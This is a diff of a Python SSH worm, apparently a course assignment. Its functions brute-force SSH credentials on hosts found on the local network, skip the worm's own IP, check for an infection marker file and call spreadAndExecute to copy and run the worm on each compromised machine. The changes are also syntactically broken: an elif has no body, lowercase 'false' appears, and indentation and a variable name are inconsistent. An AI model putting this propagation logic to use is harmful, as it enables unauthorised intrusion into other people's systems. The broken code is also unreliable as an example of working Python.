@@ -123,9 +123,10 @@ def attackSystem(host):
 		# instance of the SSH connection
 		# to the remote system. 
 		attemptResults=tryCredentials(host, userName, password, sshClient)
-		if attemptResults != 0:
-			pass
-			
+		if attemptResults == 3:
+			return None
+		elif attemptResults ==1:
+
 		else:
 			return(ssh,username,password)
 		
@@ -203,7 +204,7 @@ def AttactMode():
 	# TODO: Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
-	for(i in networkHosts):
+	for i in networkHosts:
 		if networkHosts[i] != localIP:
 		tempIP.append(networkHosts[i])
 	print "Found hosts: ", tempIP
@@ -219,40 +220,18 @@ def AttactMode():
 	
 	
 		# Did the attack succeed?
-		if sshInfo:
+		if sshInfo!= None:
+			if isInfectedSystem()==false:
 		
-			print "Trying to spread"
+				print "Trying to spread"
+
+				# If the system was already infected proceed.
+				# Otherwise, infect the system and terminate.
+				# Infect that system
+				spreadAndExecute(sshInfo[0])
 		
-			# TODO: Check if the system was	
-			# already infected. This can be
-			# done by checking whether the
-			# remote system contains /tmp/infected.txt
-			# file (which the worm will place there
-			# when it first infects the system)
-			# This can be done using code similar to
-			# the code below:
-			# try:
-			#	 remotepath = '/tmp/infected.txt'
-			#        localpath = '/home/cpsc/'
-			#	 # Copy the file from the specified
-			#	 # remote path to the specified
-			# 	 # local path. If the file does exist
-			#	 # at the remote path, then get()
-			# 	 # will throw IOError exception
-			# 	 # (that is, we know the system is
-			# 	 # not yet infected).
-			# 
-			#        sftp.get(filepath, localpath)
-			# except IOError:
-			#       print "This system should be infected"
-			#
-			#
-			# If the system was already infected proceed.
-			# Otherwise, infect the system and terminate.
-			# Infect that system
-			spreadAndExecute(sshInfo[0])
-		
-			print "Spreading complete"	
+				print "Spreading complete"	
+				exit()
 	
 
 
